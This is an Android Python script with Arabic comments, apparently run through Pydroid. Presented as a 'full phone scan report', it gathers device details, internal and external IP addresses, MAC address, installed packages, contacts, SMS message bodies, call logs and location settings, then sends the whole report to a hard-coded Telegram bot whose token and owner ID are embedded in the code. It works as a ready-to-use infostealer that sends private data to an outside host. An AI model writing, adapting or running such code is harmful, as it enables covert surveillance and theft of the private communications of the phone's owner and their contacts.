import os
import platform
import subprocess
import socket
import requests
import json

# بيانات البوت الخاصة بك
BOT_TOKEN = "6726501483:AAG1ykcBDssPit_emLCbu6mRj2VNCCsqtSk"
OWNER_ID = "1431886140"

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": OWNER_ID, "text": message, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload)
    except:
        pass

def get_info():
    report = "📱 **تقرير فحص الهاتف الكامل** 📱\n\n"
    
    # 1. معلومات الجهاز والنظام
    report += "🔹 **الجهاز والنظام:**\n"
    report += f"- المصنع: {subprocess.getoutput('getprop ro.product.brand')}\n"
    report += f"- الموديل: {subprocess.getoutput('getprop ro.product.model')}\n"
    report += f"- إصدار أندرويد: {subprocess.getoutput('getprop ro.build.version.release')}\n"
    report += f"- تحديث الأمان: {subprocess.getprop('ro.build.version.security_patch') if hasattr(subprocess, 'getprop') else subprocess.getoutput('getprop ro.build.version.security_patch')}\n\n"

    # 2. المعالج والذاكرة
    report += "🔹 **المعالج والذاكرة:**\n"
    report += f"- البنية: {platform.machine()}\n"
    report += f"- الأنوية: {os.cpu_count()}\n"
    report += f"- الذاكرة:\n{subprocess.getoutput('free -m')}\n\n"

    # 3. الشبكة
    report += "🔹 **الشبكة:**\n"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        report += f"- IP الداخلي: {s.getsockname()[0]}\n"
        s.close()
        public_ip = requests.get('https://api.ipify.org').text
        report += f"- IP الخارجي: {public_ip}\n"
    except: report += "- فشل جلب الـ IP\n"
    
    # عنوان MAC (غالباً محجوب في أندرويد 11+)
    report += f"- MAC Address: {subprocess.getoutput('ip addr show wlan0 | grep ether')}\n\n"

    # 4. التطبيقات المثبتة (أول 15 تطبيق لتجنب طول الرسالة)
    report += "🔹 **التطبيقات (عينة):**\n"
    apps = subprocess.getoutput("pm list packages").splitlines()
    report += "\n".join(apps[:15]) + f"\n... إجمالي: {len(apps)}\n\n"

    # 5. البيانات الحساسة (تطلب صلاحيات shell/content)
    report += "🔹 **البيانات الحساسة (Attempting):**\n"
    
    # محاولة جلب الأسماء عبر content query (تنجح إذا منح Pydroid صلاحية Contacts)
    contacts = subprocess.getoutput("content query --uri content://contacts/phones --projection display_name:number")
    report += f"- الأسماء المستخرجة:\n{contacts[:500]}...\n\n"

    # محاولة جلب الرسائل SMS
    sms = subprocess.getoutput("content query --uri content://sms --projection address:body")
    report += f"- آخر الرسائل:\n{sms[:500]}...\n\n"

    # محاولة جلب سجل المكالمات
    calls = subprocess.getoutput("content query --uri content://call_log/calls --projection number:duration:type")
    report += f"- سجل المكالمات:\n{calls[:300]}...\n\n"

    # محاولة جلب الموقع (إذا كان الـ GPS مفعل وصلاحية الموقع ممنوحة)
    location = subprocess.getoutput("settings get secure location_providers_allowed")
    report += f"- حالة الموقع: {location}\n"

    return report

if __name__ == "__main__":
    print("🚀 جاري جمع البيانات وإرسالها إلى تلجرام...")
    full_report = get_info()
    
    # تقسيم الرسالة إذا كانت طويلة جداً على تلجرام
    if len(full_report) > 4096:
        for i in range(0, len(full_report), 4096):
            send_to_telegram(full_report[i:i+4096])
    else:
        send_to_telegram(full_report)
    
    print("✅ تم الإرسال بنجاح. تفقد البوت الخاص بك.")